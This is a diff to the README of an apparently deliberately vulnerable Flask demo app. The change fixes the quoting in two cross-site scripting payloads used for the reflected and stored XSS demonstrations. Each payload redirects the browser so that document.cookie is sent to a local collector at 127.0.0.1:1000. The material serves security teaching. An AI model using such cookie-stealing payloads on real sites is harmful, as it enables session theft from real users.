@@ -25,12 +25,12 @@ As you started the flask app in development mode, any source changes should appl
 the page. If you want to clear the database, just delete the `database.db` file that is (re-)created on first use.
 
 # Demostration for reflected XSS
-* Key in `<script type=“text/javascript”>document.location=“http://127.0.0.1:1000/?c=“+document.cookie;</script>` into the query blank
+* Key in `<script type='text/javascript'>document.location='http://127.0.0.1:1000/?c='+document.cookie;</script>` into the query blank
 * Notice that the code is reflected inside the addressbar as a query.
 * When the user clicks on the link containing the address, their cookies from the vulnerable website can be stolen
 
 # Demostration for Stored XSS
-* Key in `<script type=“text/javascript”>document.location=“http://127.0.0.1:1000/?c=“+document.cookie;</script>` into the comment blank
+* Key in `<script type='text/javascript'>document.location='http://127.0.0.1:1000/?c='+document.cookie;</script>` into the comment blank
 * Notice that the code is stored within the website
 * When the user access the website, their cookies will automatically stolen until the comment is removed
 
